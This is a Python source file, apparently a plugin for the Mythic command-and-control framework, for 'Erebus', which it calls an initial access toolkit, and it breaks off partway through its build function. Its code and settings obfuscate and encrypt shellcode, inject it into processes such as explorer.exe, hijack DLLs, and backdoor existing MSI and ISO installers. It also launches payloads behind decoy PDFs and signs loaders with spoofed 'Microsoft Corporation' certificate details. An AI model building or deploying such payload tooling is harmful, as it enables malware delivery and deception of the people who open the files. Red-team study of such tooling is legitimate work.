'''
- Author(s): Lavender-exe // hunterino-sec // Whispergate
- Title: Erebus
- Description: Initial Access Wrapper

TODO:
- Triggers
    - LNK
        -   https://github.com/strayge/pylnk
'''
from erebus_wrapper.erebus.modules.payload_dll_proxy import generate_proxies
from erebus_wrapper.erebus.modules.container_clickonce import build_clickonce
from erebus_wrapper.erebus.modules.container_msi import (
    build_msi,
    hijack_msi,
    add_multiple_files_to_msi,
    ErebusActionTypes,
    ErebusInstallerToolkit
)
from erebus_wrapper.erebus.modules.trigger_lnk import create_payload_trigger
from erebus_wrapper.erebus.modules.trigger_bat import create_bat_payload_trigger
from erebus_wrapper.erebus.modules.trigger_msi import create_msi_payload_trigger
from erebus_wrapper.erebus.modules.trigger_clickonce import create_clickonce_trigger
from erebus_wrapper.erebus.modules.container_archive import build_7z, build_zip
from erebus_wrapper.erebus.modules.container_iso import build_iso
from erebus_wrapper.erebus.modules.codesigner import self_sign_payload, get_remote_cert_details, sign_with_provided_cert

from mythic_container.PayloadBuilder import *
from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *

from pathlib import PurePath
from distutils.dir_util import copy_tree
from jinja2 import Environment, FileSystemLoader
import os
import asyncio
import subprocess
import tempfile
import shutil
from pathlib import Path


ENCRYPTION_METHODS = {
    "AES128_CBC" :  "aes_128",
    "AES256_CBC" :  "aes_cbc",
    "AES256_ECB" :  "aes_ecb",
    "CHACHA20"   :  "chacha20",
    "RC4"        :  "rc4",
    "SALSA20"    :  "salsa20",
    "XOR"        :  "xor",
    "XOR_COMPLEX":  "xor_complex",
}

COMPRESSION_METHODS = {
    "LZNT1": "lznt",
    "RLE"  : "rle",
    "NONE" : ""
}

ENCODING_METHODS = {
    "ALPHA32" : "alpha",
    "ASCII85" : "ascii85",
    "BASE64"  : "base64",
    "WORDS256": "words",
    "NONE"    : ""
}

SHELLCODE_FORMAT = {
    "C"          : "c",
    "CSharp"     : "csharp",
    "Nim"        : "nim",
    "Go"         : "go",
    "Python"     : "py",
    "Powershell" : "ps1",
    "VBA"        : "vba",
    "VBScript"   : "vbs",
    "Rust"       : "rust",
    "JavaScript" : "js",
    "Zig"        : "zig",
    "Raw"        : "raw",
}

FINAL_PAYLOAD_EXTENSIONS = [
    "7z",
    "zip",
    "tar",
    "tar.gz",
    "iso",
    "msi"
]


class ErebusWrapper(PayloadType):
    name = "erebus_wrapper"
    author = "@Lavender-exe, @hunterino-sec"
    semver = "v0.0.1"
    note = f"An Initial Access Toolkit built to speed up payload development & delivery.\nVersion: {semver}"

    file_extension = "zip"
    supported_os = [
        SupportedOS.Windows
        # SupportedOS.Linux, # Not Supported Yet
        # SupportedOS.MacOS, # Not Supported Yet
    ]

    wrapper = True
    wrapped_payloads = []
    c2_profiles = []

    agent_type = AgentType.Wrapper
    agent_path = PurePath(".") / "erebus_wrapper"
    agent_icon_path = agent_path / "Erebus.svg"
    agent_code_path = agent_path / "agent_code"

    build_parameters = [
        BuildParameter(
            name = "0.0 Main Payload Type",
            parameter_type = BuildParameterType.ChooseOne,
            description = """Select the main payload type (Shellcode Loader or DLL Hijack)
NOTE: Loaders are written in C++ - Supplied shellcode format must be raw for `Loader` and C for `Hijack`.
""",
            choices = ["Loader", "Hijack"],
            default_value="Loader",
        ),

        BuildParameter(
            name = "0.1 Loader Type",
            parameter_type = BuildParameterType.ChooseOne,
            description = "Select the loader's filetype.",
            choices = ["ClickOnce", "Shellcode Loader"],
            default_value = "Shellcode Loader",
            hide_conditions = [
                HideCondition(name="0.0 Main Payload Type", operand=HideConditionOperand.NotEQ, value="Loader"),
            ]
        ),

        BuildParameter(
            name = "0.2 Loader Format",
            parameter_type = BuildParameterType.ChooseOne,
            description = f"Select the loader's filetype. (DLL Unsupported in {semver})",
            choices = ["EXE", "DLL"],
            default_value = "EXE",
            hide_conditions = [
                HideCondition(name="0.1 Loader Type", operand=HideConditionOperand.NotEQ, value="Shellcode Loader"),
                HideCondition(name="2.4 Shellcode Format", operand=HideConditionOperand.NotEQ, value="C"),
            ]
        ),

        BuildParameter(
            name = "0.3 Loader Build Configuration",
            parameter_type = BuildParameterType.ChooseOne,
            description = "Select the loader's build config.",
            choices = ["debug", "release"],
            default_value = "debug",
            hide_conditions = [
                HideCondition(name="0.1 Loader Type", operand=HideConditionOperand.NotEQ, value="Shellcode Loader"),
                HideCondition(name="2.4 Shellcode Format", operand=HideConditionOperand.NotEQ, value="C"),
            ]
        ),

        BuildParameter(
            name = "0.3 ClickOnce Build Configuration",
            parameter_type = BuildParameterType.ChooseOne,
            description = "Select the loader's build config.",
            choices = ["debug", "release"],
            default_value = "debug",
            hide_conditions = [
                HideCondition(name="0.1 Loader Type", operand=HideConditionOperand.NotEQ, value="ClickOnce"),
                HideCondition(name="2.4 Shellcode Format", operand=HideConditionOperand.NotEQ, value="CSharp"),
            ]
        ),

        # Shellcode Loader Injection Configuration
        BuildParameter(
            name = "0.4 Shellcode Loader - Injection Type",
            parameter_type = BuildParameterType.ChooseOne,
            description = """Select the injection technique for the Shellcode Loader:
1 = NtQueueApcThread (Remote)
2 = NtMapViewOfSection (Remote)
3 = CreateFiber (Self)
4 = EarlyCascade (Remote)
5 = PoolParty (Remote)""",
            choices = ["1", "2", "3", "4", "5"],
            default_value = "1",
            hide_conditions = [
                HideCondition(name="0.1 Loader Type", operand=HideConditionOperand.NotEQ, value="Shellcode Loader"),
                HideCondition(name="2.4 Shellcode Format", operand=HideConditionOperand.NotEQ, value="C"),
            ]
        ),

        BuildParameter(
            name = "0.5 Shellcode Loader - Target Process",
            parameter_type = BuildParameterType.String,
            description = "Target process for remote injection (e.g., notepad.exe, explorer.exe)",
            default_value = "notepad.exe",
            hide_conditions = [
                HideCondition(name="0.1 Loader Type", operand=HideConditionOperand.NotEQ, value="Shellcode Loader"),
                HideCondition(name="2.4 Shellcode Format", operand=HideConditionOperand.NotEQ, value="C"),
                HideCondition(name="0.4 Shellcode Loader - Injection Type", operand=HideConditionOperand.EQ, value="3"),
            ]
        ),

        # ClickOnce Loader Injection Configuration
        BuildParameter(
            name = "0.6 ClickOnce - Injection Method",
            parameter_type = BuildParameterType.ChooseOne,
            description = """Select the injection method for ClickOnce:
earlycascade (remote)
poolparty (remote)
classic (remote)
createfiber (self)
enumdesktops (self)""",
            choices = ["createfiber", "earlycascade", "poolparty", "classic", "enumdesktops"],
            default_value = "createfiber",
            hide_conditions = [
                HideCondition(name="0.1 Loader Type", operand=HideConditionOperand.NotEQ, value="ClickOnce"),
                HideCondition(name="2.4 Shellcode Format", operand=HideConditionOperand.NotEQ, value="CSharp"),
            ]
        ),

        BuildParameter(
            name = "0.7 ClickOnce - Target Process",
            parameter_type = BuildParameterType.String,
            description = "Target process for remote injection methods (leave empty for explorer.exe)",
            default_value = "explorer.exe",
            hide_conditions = [
                HideCondition(name="0.1 Loader Type", operand=HideConditionOperand.NotEQ, value="ClickOnce"),
                HideCondition(name="2.4 Shellcode Format", operand=HideConditionOperand.NotEQ, value="CSharp"),
                HideCondition(name="0.6 ClickOnce - Injection Method", operand=HideConditionOperand.EQ, value="createfiber"),
                HideCondition(name="0.6 ClickOnce - Injection Method", operand=HideConditionOperand.EQ, value="enumdesktops"),
            ]
        ),

        BuildParameter(
            name = "0.8 Trigger Binary",
            parameter_type = BuildParameterType.String,
            description = "Choose a command to run when the trigger is executed.",
            default_value = "C:\\Windows\\System32\\conhost.exe",
            hide_conditions = [
                HideCondition(name="0.0 Main Payload Type", operand=HideConditionOperand.NotEQ, value="Loader"),
            ]
        ),

        BuildParameter(
            name = "0.9 Trigger Command",
            parameter_type = BuildParameterType.String,
            description = "Choose a command to run when the trigger is executed.",
            default_value = "--headless cmd.exe /Q /c erebus.exe | decoy.pdf",
            hide_conditions = [
                HideCondition(name="0.0 Main Payload Type", operand=HideConditionOperand.NotEQ, value="Loader"),
            ]
        ),

        BuildParameter(
            name = "0.10 Decoy File",
            parameter_type = BuildParameterType.File,
            description = """Upload a decoy file (PDF/XLSX/etc.).
If one is not uploaded then an example file will be used.""",
            hide_conditions = [
                HideCondition(name="0.0 Main Payload Type", operand=HideConditionOperand.NotEQ, value="Loader"),
            ]
        ),

        BuildParameter(
            name="0.11 Trigger Type",
            parameter_type=BuildParameterType.ChooseOne,
            description="Type of Trigger to toggle decoy and execution",
            choices=["LNK", "BAT", "MSI", "ClickOnce"],
            default_value="LNK",
            required=False,
        ),

        BuildParameter(
            name = "1.0 DLL Hijacking",
            parameter_type = BuildParameterType.File,
            description = f"""Prepares a given DLL for proxy-based hijacking.
NOTE: Shellcode Format must be set to C.
NOTE: ({semver}) Only supports XOR for now. Does not (currently) support encoded or compressed payloads.
""",
            hide_conditions = [
                HideCondition(name="0.0 Main Payload Type", operand=HideConditionOperand.NotEQ, value="Hijack"),
                # Change this if you are using a custom DLL Loader written in another language
                HideCondition(name="2.4 Shellcode Format", operand=HideConditionOperand.NotEQ, value="C"),
            ]
        ),

        # Shellcrypt
        BuildParameter(
            name = "2.0 Compression Type",
            parameter_type = BuildParameterType.ChooseOne,
            description = "Choose a compression type for the shellcode.",
            choices = [
                "LZNT1",
                "RLE",
                "NONE",
            ],
            default_value="NONE"
        ),

        BuildParameter(
            name = "2.1 Encryption Type",
            parameter_type = BuildParameterType.ChooseOne,
            description = "Choose an encryption type for the shellcode.",
            choices = [
                "AES128_CBC",
                "AES256_CBC",
                "AES256_ECB",
                "CHACHA20",
                "SALSA20",
                "XOR",
                "XOR_COMPLEX",
            ],
            default_value = "XOR"
        ),

        BuildParameter(
            name = "2.2 Encryption Key",
            parameter_type = BuildParameterType.String,
            description = """Choose an encryption key. A random one will be
generated if none have been entered.""",
            default_value="NONE"
        ),

        BuildParameter(
            name = "2.3 Encoding Type",
            parameter_type = BuildParameterType.ChooseOne,
            description = "Choose an encoding type for the shellcode.",
            choices = [
                "ALPHA32",
                "ASCII85",
                "BASE64",
                "WORDS256",
                "NONE",
            ],
            default_value="NONE"
        ),

        BuildParameter(
            name = "2.4 Shellcode Format",
            parameter_type = BuildParameterType.ChooseOne,
            description = "Choose a format for the obfuscated shellcode.",
            choices = [
                "C",
                "CSharp",
                "Nim",
                "Go",
                "Python",
                "Powershell",
                "VBA",
                "VBScript",
                "Rust",
                "JavaScript",
                "Zig",
                "Raw",
            ],
            default_value = "C",
            required = True,
        ),

        # Archive
        BuildParameter(
            name = "3.0 Container Type",
            parameter_type = BuildParameterType.ChooseOne,
            description = "Choose the final payload container type.",
            choices = ["ISO", "7z", "Zip", "MSI"],
            default_value = "Zip",
        ),

        BuildParameter(
            name="3.1 Compression Level",
            parameter_type=BuildParameterType.ChooseOne,
            description="Select compression level (9 is max).",
            choices=["0", "1", "3", "5", "7", "9"],
            default_value="9",
            hide_conditions = [
                HideCondition(name="3.0 Container Type", operand=HideConditionOperand.EQ, value="ISO"),
                HideCondition(name="3.0 Container Type", operand=HideConditionOperand.EQ, value="MSI"),
            ]
        ),

        BuildParameter(
            name="3.2 Archive Password",
            parameter_type=BuildParameterType.String,
            description="Optional password for the archive (leave empty for none).",
            default_value="",
            required=False,
            hide_conditions = [
                HideCondition(name="3.0 Container Type", operand=HideConditionOperand.EQ, value="ISO"),
                HideCondition(name="3.0 Container Type", operand=HideConditionOperand.EQ, value="MSI"),
            ]
        ),

        #ISO
        BuildParameter(
            name="4.0 ISO Volume ID",
            parameter_type=BuildParameterType.String,
            description="ISO Volume name seen in Explorer.",
            default_value="EREBUS",
            required=False,
            hide_conditions=[
                HideCondition(name="3.0 Container Type", operand=HideConditionOperand.NotEQ, value="ISO")
            ]
        ),

        BuildParameter(
            name="4.1 ISO enable Autorun",
            parameter_type=BuildParameterType.Boolean,
            description="Enable Autorun for ISO",
            default_value=False,
            required=False,
            hide_conditions=[
                HideCondition(name="3.0 Container Type", operand=HideConditionOperand.NotEQ, value="ISO")
            ]
        ),

        BuildParameter(
            name="4.2 ISO Backdoor File",
            parameter_type=BuildParameterType.File,
            description="Backdoor an existing ISO",
            required=False,
            hide_conditions=[
                HideCondition(name="3.0 Container Type", operand=HideConditionOperand.NotEQ, value="ISO")
            ]
        ),
        BuildParameter(
            name="5.0 MSI Product Name",
            parameter_type=BuildParameterType.String,
            description="Application name shown in MSI/UI",
            default_value="System Updater",
            required=False,
            hide_conditions=[
                HideCondition(name="3.0 Container Type", operand=HideConditionOperand.NotEQ, value="MSI")
            ]
        ),
        BuildParameter(
            name="5.1 MSI Manufacturer",
            parameter_type=BuildParameterType.String,
            description="Company name shown in MSI metadata",
            default_value="Microsoft Corporation",
            required=False,
            hide_conditions=[
                HideCondition(name="3.0 Container Type", operand=HideConditionOperand.NotEQ, value="MSI")
            ]
        ),
        BuildParameter(
            name="5.2 MSI Install Scope",
            parameter_type=BuildParameterType.ChooseOne,
            description="Machine=Admin Required (Program Files), User=No Admin (AppData)",
            choices=["User", "Machine"],
            default_value="User",
            hide_conditions=[
                HideCondition(name="3.0 Container Type", operand=HideConditionOperand.NotEQ, value="MSI")
            ]
        ),
        BuildParameter(
            name="5.3 MSI Backdoor File",
            parameter_type=BuildParameterType.File,
            description="Backdoor an existing MSI installer by injecting payload execution",
            required=False,
            hide_conditions=[
                HideCondition(name="3.0 Container Type", operand=HideConditionOperand.NotEQ, value="MSI")
            ]
        ),
        BuildParameter(
            name="5.4 MSI Attack Type",
            parameter_type=BuildParameterType.ChooseOne,
            description="""Attack vector for MSI backdoor injection:
- execute: Run command via CustomAction (stealthiest)
- run-exe: Extract and execute EXE from Binary table
- load-dll: Load native DLL via DllEntry
- dotnet: Load .NET assembly (auto-detected)
- script: Execute VBScript/JScript (requires entry point)""",
            choices=["execute", "run-exe", "load-dll", "dotnet", "script"],
            default_value="execute",
            hide_conditions=[
                HideCondition(name="3.0 Container Type", operand=HideConditionOperand.NotEQ, value="MSI"),
                HideCondition(name="5.3 MSI Backdoor File", operand=HideConditionOperand.EQ, value="")
            ]
        ),
        BuildParameter(
            name="5.5 MSI Entry Point",
            parameter_type=BuildParameterType.String,
            description="DLL export function or script function name (required for load-dll/dotnet/script attacks)",
            default_value="",
            required=False,
            hide_conditions=[
                HideCondition(name="3.0 Container Type", operand=HideConditionOperand.NotEQ, value="MSI"),
                HideCondition(name="5.3 MSI Backdoor File", operand=HideConditionOperand.EQ, value=""),
                HideCondition(name="5.4 MSI Attack Type", operand=HideConditionOperand.EQ, value="execute"),
                HideCondition(name="5.4 MSI Attack Type", operand=HideConditionOperand.EQ, value="run-exe")
            ]
        ),
        BuildParameter(
            name="5.6 MSI Command Arguments",
            parameter_type=BuildParameterType.String,
            description="Command line arguments for execute/run-exe attacks",
            default_value="",
            required=False,
            hide_conditions=[
                HideCondition(name="3.0 Container Type", operand=HideConditionOperand.NotEQ, value="MSI"),
                HideCondition(name="5.3 MSI Backdoor File", operand=HideConditionOperand.EQ, value=""),
                HideCondition(name="5.4 MSI Attack Type", operand=HideConditionOperand.NotEQ, value="execute"),
                HideCondition(name="5.4 MSI Attack Type", operand=HideConditionOperand.NotEQ, value="run-exe")
            ]
        ),
        BuildParameter(
            name="5.7 MSI Execution Condition",
            parameter_type=BuildParameterType.String,
            description="MSI condition for payload execution (default: NOT REMOVE = run on install only)",
            default_value="NOT REMOVE",
            required=False,
            hide_conditions=[
                HideCondition(name="3.0 Container Type", operand=HideConditionOperand.NotEQ, value="MSI"),
                HideCondition(name="5.3 MSI Backdoor File", operand=HideConditionOperand.EQ, value="")
            ]
        ),
        BuildParameter(
            name="5.8 MSI Custom Action Name",
            parameter_type=BuildParameterType.String,
            description="Custom action name (leave empty for random generation)",
            default_value="",
            required=False,
            hide_conditions=[
                HideCondition(name="3.0 Container Type", operand=HideConditionOperand.NotEQ, value="MSI"),
                HideCondition(name="5.3 MSI Backdoor File", operand=HideConditionOperand.EQ, value="")
            ]
        ),
        #Codesigning
        BuildParameter(
            name="6.0 Codesign Loader",
            parameter_type=BuildParameterType.Boolean,
            description="Sign the loader with a codesigning cert",
            required=False,
        ),

        BuildParameter(
            name="6.1 Codesign Type",
            parameter_type=BuildParameterType.ChooseOne,
            description="Backdoor an existing ISO",
            choices=["SelfSign", "Spoof URL", "Provide Certificate"],
            required=False,
            hide_conditions=[
                HideCondition(name="6.0 Codesign Loader", operand=HideConditionOperand.EQ, value=False)
            ]
        ),

        BuildParameter(
            name="6.2 Codesign CN",
            parameter_type=BuildParameterType.String,
            default_value="Microsoft Corporation",
            description="Common Name (CN) for self-signed cert",
            hide_conditions=[
                HideCondition(name="6.0 Codesign Loader", operand=HideConditionOperand.EQ, value=False),
                HideCondition(name="6.1 Codesign Type", operand=HideConditionOperand.NotEQ, value="SelfSign")
            ]
        ),

        BuildParameter(
            name="6.3 Codesign Orgname",
            parameter_type=BuildParameterType.String,
            default_value="Microsoft Corporation",
            description="Organisation Name for self-signed cert",
            hide_conditions=[
                HideCondition(name="6.0 Codesign Loader", operand=HideConditionOperand.EQ, value=False),
                HideCondition(name="6.1 Codesign Type", operand=HideConditionOperand.NotEQ, value="SelfSign")
            ]
        ),

        BuildParameter(
            name="6.4 Codesign Spoof URL",
            parameter_type=BuildParameterType.String,
            default_value="www.google.com",
            description="URL to clone certificate details from",
            hide_conditions=[
                HideCondition(name="6.0 Codesign Loader", operand=HideConditionOperand.EQ, value="False"),
                HideCondition(name="6.1 Codesign Type", operand=HideConditionOperand.NotEQ, value="Spoof URL")
            ]
        ),

        BuildParameter(
            name="6.5 Codesign Cert",
            parameter_type=BuildParameterType.File,
            description="Upload PFX/P12 certificate",
            hide_conditions=[
                HideCondition(name="6.0 Codesign Loader", operand=HideConditionOperand.EQ, value="False"),
                HideCondition(name="6.1 Codesign Type", operand=HideConditionOperand.NotEQ, value="Provide Certificate")
            ]
        ),
        BuildParameter(
            name="6.6 Codesign Cert Password",
            parameter_type=BuildParameterType.String,
            default_value="",
            description="Certificate password (leave empty if none)",
            hide_conditions=[
                HideCondition(name="6.0 Codesign Loader", operand=HideConditionOperand.EQ, value="False"),
                HideCondition(name="6.1 Codesign Type", operand=HideConditionOperand.NotEQ, value="Provide Certificate")
            ]
        ),

    ]

    build_steps = [
        BuildStep(step_name = "Gathering Files",
                  step_description = "Copy files to temporary location"),

        BuildStep(step_name = "Header Check",
                  step_description = "Check file for MZ Header"),

        BuildStep(step_name = "Shellcode Obfuscation",
                  step_description = "Obfuscating shellcode based on selected options"),

        BuildStep(step_name = "Gathering DLL Exports for Hijacking",
                  step_description = "Extracts exports from the uploaded DLL to be used for proxying"),

        BuildStep(step_name = "Compiling DLL Payload",
                  step_description = "Compiling DLL Payload with Hijacked Info & Obfuscated Shellcode"),

        BuildStep(step_name = "Compiling Shellcode Loader",
            step_description = "Compiling Shellcode Loader with Obfuscated Raw Agent Shellcode"),

        BuildStep(step_name = "Compiling ClickOnce Loader",
            step_description = "Compiling ClickOnce Loader with Obfuscated Raw Agent Shellcode"),

        BuildStep(step_name = "Sign Shellcode Loader",
            step_description = "Signing the Shellcode Loader with a code signing certificate"),

        BuildStep(step_name = "Backdooring MSI",
                  step_description = "Injecting payload into existing MSI installer"),

        BuildStep(step_name = "Adding Trigger",
                  step_description = "Creating trigger to execute given payload"),

        BuildStep(step_name = "Creating Decoy",
                  step_description= "Creating a placeholder decoy file"),

        BuildStep(step_name = "Containerising",
                  step_description = "Adding payload into chosen container"),
    ]

    async def backdoor_msi_payload(self, agent_build_path):
        """Backdoors an uploaded MSI installer with the generated payload and places it in the payload directory

        Enhanced with support for multiple attack vectors:
        - execute: Direct command execution
        - run-exe: Binary extraction and execution
        - load-dll: DLL loading with custom entry points
        - dotnet: .NET assembly loading
        - script: VBScript/JScript execution
        """
        msi_backdoor_uuid = self.get_parameter("5.3 MSI Backdoor File")
        if not msi_backdoor_uuid:
            return  # No MSI to backdoor

        try:
            # Download the uploaded MSI file
            file_resp = await SendMythicRPCFileGetContent(
                MythicRPCFileGetContentMessage(AgentFileId=msi_backdoor_uuid)
            )

            # Save the MSI to a temporary location
            temp_dir = Path(tempfile.gettempdir())
            source_msi_path = temp_dir / f"source_{msi_backdoor_uuid}.msi"
            source_msi_path.write_bytes(file_resp.Content)
            await SendMythicRPCPayloadUpdatebuildStep(
                MythicRPCPayloadUpdateBuildStepMessage(
                PayloadUUID=self.uuid,
                StepName="Backdooring MSI",
                StepStdout="Downloading uploaded MSI installer...",
                StepSuccess=True,
            ))

            # Get attack parameters
            attack_type = self.get_parameter("5.4 MSI Attack Type")
            entry_point = self.get_parameter("5.5 MSI Entry Point")
            command_args = self.get_parameter("5.6 MSI Command Arguments")
            condition = self.get_parameter("5.7 MSI Execution Condition")
            custom_action_name = self.get_parameter("5.8 MSI Custom Action Name")

            # Generate random name if not provided
            if not custom_action_name:
                custom_action_name = ErebusInstallerToolkit.generate_identifier(6, 12)

            await SendMythicRPCPayloadUpdatebuildStep(
                MythicRPCPayloadUpdateBuildStepMessage(
                PayloadUUID=self.uuid,
                StepName="Backdooring MSI",
                StepStdout=f"Injecting payload into MSI installer (attack: {attack_type})...",
                StepSuccess=True,
            ))

            # Get the payload path
            payload_dir = Path(agent_build_path) / "payload"
            payload_file = None

            # Determine payload file based on attack type
            if attack_type in ["load-dll", "dotnet"]:
                # Look for DLL
                try:
                    payload_file = next(p for p in payload_dir.iterdir()
                                      if p.is_file() and p.suffix.lower() == ".dll")
                except StopIteration:
                    # Fallback to EXE if no DLL found
                    try:
                        payload_file = next(p for p in payload_dir.iterdir()
                                          if p.is_file() and p.suffix.lower() == ".exe")
                    except StopIteration:
                        raise RuntimeError("No DLL or EXE payload found for MSI backdooring!")

            elif attack_type == "script":
                # Look for script files
                try:
                    payload_file = next(p for p in payload_dir.iterdir()
                                      if p.is_file() and p.suffix.lower() in [".vbs",
                                                                              ".js", ".vbe", ".jse"])
                except StopIteration:
                    raise RuntimeError("No script file (.vbs/.js) found for script attack!")

            else:  # execute, run-exe
                # Look for EXE
                try:
                    payload_file = next(p for p in payload_dir.iterdir()
                                      if p.is_file() and p.suffix.lower() == ".exe")
                except StopIteration:
                    raise RuntimeError("No .exe payload found in payload directory for MSI backdooring!")

            # Validate entry point for attacks that require it
            if attack_type in ["load-dll", "dotnet", "script"] and not entry_point:
                if attack_type == "script":
                    raise RuntimeError(f"Entry point (function name) is required for {attack_type} attack")
                else:
                    # Use default for DLL
                    entry_point = "DllEntry"

            # Call hijack_msi with advanced parameters
            backdoored_msi_path = hijack_msi(
                source_msi=source_msi_path,
                payload_path=payload_file,
                build_path=Path(agent_build_path),
                custom_action_name=custom_action_name,
                attack_type=attack_type,
                entry_point=entry_point,
                command_args=command_args,
                condition=condition
            )

            # Move the backdoored MSI into the payload directory
            final_msi_path = payload_dir / f"{source_msi_path.stem}-backdoored.msi"
            shutil.copy2(backdoored_msi_path, final_msi_path)

            # Build success message with attack details
            success_msg = f"Successfully backdoored MSI: {final_msi_path.name}\n"
            success_msg += f"Attack Type: {attack_type}\n"
            success_msg += f"Custom Action: {custom_action_name}\n"
            if entry_point:
                success_msg += f"Entry Point: {entry_point}\n"
            if command_args:
                success_msg += f"Arguments: {command_args}\n"
            success_msg += f"Condition: {condition}"

            await SendMythicRPCPayloadUpdatebuildStep(
                MythicRPCPayloadUpdateBuildStepMessage(
                PayloadUUID=self.uuid,
                StepName="Backdooring MSI",
                StepStdout=success_msg,
            ))

        except Exception as e:
            await SendMythicRPCPayloadUpdatebuildStep(
                MythicRPCPayloadUpdateBuildStepMessage(
                PayloadUUID=self.uuid,
                StepName="Backdooring MSI",
                StepStdout=f"Failed to backdoor MSI: {str(e)}",
                StepSuccess=False,
            ))
            raise RuntimeError(f"MSI backdooring failed: {str(e)}")

    async def containerise_payload(self,agent_build_path):
        """Creates a container and adds all files generated from the payload function inside of the given archive/media"""

        target_ext = f".{self.get_parameter('0.11 Trigger Type').lower()}"

        match(self.get_parameter("3.0 Container Type")):
            case "7z":
                  return build_7z(
                    compression=self.get_parameter("3.1 Compression Level"),
                    password=self.get_parameter("3.2 Archive Password"),
                    build_path=Path(agent_build_path),
                    visible_extension=target_ext
                )

            case "Zip":
                return build_zip(
                    compression=self.get_parameter("3.1 Compression Level"),
                    password=self.get_parameter("3.2 Archive Password"),
                    build_path=Path(agent_build_path),
                    visible_extension=target_ext
                )

            case "ISO":
                source_iso_path = None
                iso_uuid = self.get_parameter("4.2 ISO Backdoor File")
                if iso_uuid:
                    file_resp = await SendMythicRPCFileGetContent(
                        MythicRPCFileGetContentMessage(AgentFileId=iso_uuid)
                    )
                    if file_resp.Success:
                        filename = f"template_{iso_uuid}.iso"
                        temp_dir = Path(tempfile.gettempdir())
                        source_iso_path = temp_dir / filename
                        source_iso_path.write_bytes(file_resp.Content)
                return build_iso(
                                    volume_id=self.get_parameter("4.0 ISO Volume ID"),
                                    enable_autorun = self.get_parameter("4.1 ISO enable Autorun"),
                                    source_iso=source_iso_path,
                                    build_path=Path(agent_build_path),
                                    visible_extension=target_ext
                                )

            case "MSI":
                return build_msi(
                    build_path=Path(agent_build_path),
                    app_name=self.get_parameter("5.0 MSI Product Name"),
                    manufacturer=self.get_parameter("5.1 MSI Manufacturer"),
                    install_scope=self.get_parameter("5.2 MSI Install Scope")
                )

        return None

    def create_triggers(self):
        """Creates a trigger to execute the payload

        Raises:
            NotImplementedError: Function not implemented yet.

        TODO:
            - LNK Trigger
            - LOLBIN Trigger
            - MSI/MST Trigger
            - ClickOnce Trigger
        """
        raise NotImplementedError

    async def build(self) -> BuildResponse:
        response = BuildResponse(status = BuildStatus.Error)
        output = ""

        try:
            agent_build_path = tempfile.TemporaryDirectory(suffix = self.uuid).name
            copy_tree(str(self.agent_code_path), agent_build_path)

            mythic_shellcode_path = PurePath(agent_build_path) / "shellcode" / "payload.bin"
            mythic_shellcode_path = str(mythic_shellcode_path)

            obfuscated_shellcode_path = PurePath(agent_build_path) / "shellcode" / "obfuscated.bin"
            obfuscated_shellcode_path = str(obfuscated_shellcode_path)

            shellcode_loader_path = PurePath(agent_build_path) / "Erebus.Loaders" / "Erebus.Loader"
            clickonce_loader_path = PurePath(agent_build_path) / "Erebus.Loaders" / "Erebus.ClickOnce"
            encryption_shellcode_path = PurePath(agent_build_path) / "Erebus.Loaders" / "Erebus.Loader" / "include" / "shellcode.hpp"

            shellcode_loader_path = str(shellcode_loader_path)
            clickonce_loader_path = str(clickonce_loader_path)
            encryption_shellcode_path = str(encryption_shellcode_path)

            shellcrypt_path = PurePath(agent_build_path) / "shellcrypt" / "shellcrypt.py"
            shellcrypt_path = str(shellcrypt_path)

            templates_path = PurePath(agent_build_path) / "templates"
            dll_hijack_template_path = templates_path / "dll_template.cpp"
            dll_target_path = templates_path / "dll_target.dll"
            dll_exports_path = templates_path / "proxy.def"

            templates_path = str(templates_path)
            dll_hijack_template_path = str(dll_hijack_template_path)
            dll_target_path = str(dll_target_path)
            dll_exports_path = str(dll_exports_path)

            os.mkdir(path=Path(agent_build_path) / "payload")

            environment = Environment(loader=FileSystemLoader(templates_path))

            with open(mythic_shellcode_path, "wb") as file:
                file.write(self.wrapped_payload)

            if os.stat(mythic_shellcode_path) == 0:
                response.status = BuildStatus.Error
                response.build_stderr = "Failed to write Mythic Shellcode to placeholder file."
                await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
                        PayloadUUID=self.uuid,
                        StepName="Gathering Files",
                        StepStdout="Failed to write Mythic Shellcode to placeholder file.",
                        StepSuccess=False
                    ))
                return response

            response.status = BuildStatus.Success
            response.build_message = "Files Gathered for Modification."
            await SendMythicRPCPayloadUpdatebuildStep(
                MythicRPCPayloadUpdateBuildStepMessage(
                PayloadUUID = self.uuid,
                StepName = "Gathering Files",
                StepStdout = "Gathered files to obfuscate shellcode",
                StepSuccess = True
            ))

            ######################### Shellcode Obfuscation Section #########################
            with open(str(mythic_shellcode_path), "rb") as f:
                header = f.read(2)
                if header == b"\x4d\x5a":
                    response.status = BuildStatus.Error
                    response.build_stderr = "Supplied payload is a PE instead of raw shellcode."
                    await SendMythicRPCPayloadUpdatebuildStep(
                        MythicRPCPayloadUpdateBuildStepMessage(
                        PayloadUUID=self.uuid,
                        StepName="Header Check",
                        StepStdout="Found leading MZ header - supplied file was not shellcode",
                        StepSuccess=False
                    ))
                    return response
            response.status = BuildStatus.Success
            response.build_message = "No leading MZ header found in payload."
            await SendMythicRPCPayloadUpdatebuildStep(
                MythicRPCPayloadUpdateBuildStepMessage(
                PayloadUUID=self.uuid,
                StepName="Header Check",
                StepStdout="No leading MZ header found in payload",
                StepSuccess=True
            ))

            cmd = [
                "python",
                shellcrypt_path,
                "-i", mythic_shellcode_path,
                "-e", ENCRYPTION_METHODS[self.get_parameter("2.1 Encryption Type")],
                "-f", SHELLCODE_FORMAT[self.get_parameter("2.4 Shellcode Format")],
            ]

            if self.get_parameter("2.4 Shellcode Format") != "Raw":
                cmd += ["-a", "shellcode"]

            if self.get_parameter("2.0 Compression Type") != "NONE":
                cmd += ["-c", COMPRESSION_METHODS[self.get_parameter("2.0 Compression Type")]]

            if self.get_parameter("2.3 Encoding Type") != "NONE":
                cmd += ["-d", ENCODING_METHODS[self.get_parameter("2.3 Encoding Type")]]

            if self.get_parameter("2.2 Encryption Key") != "NONE":
                cmd += ["-k", self.get_parameter("2.2 Encryption Key")]

            cmd += ["-o", obfuscated_shellcode_path]

            process = await asyncio.create_subprocess_exec(
                *cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            stdout, stderr = await process.communicate()

            if stdout:
                output += f"[stdout]\n{stdout.decode()}"
            if stderr:
                output += f"[stderr]\n{stderr.decode()}"

            if os.path.exists(obfuscated_shellcode_path):
                # Copy the obfuscated shellcode file over to the shellcode.hpp file
                if self.get_parameter("2.4 Shellcode Format") == "C":
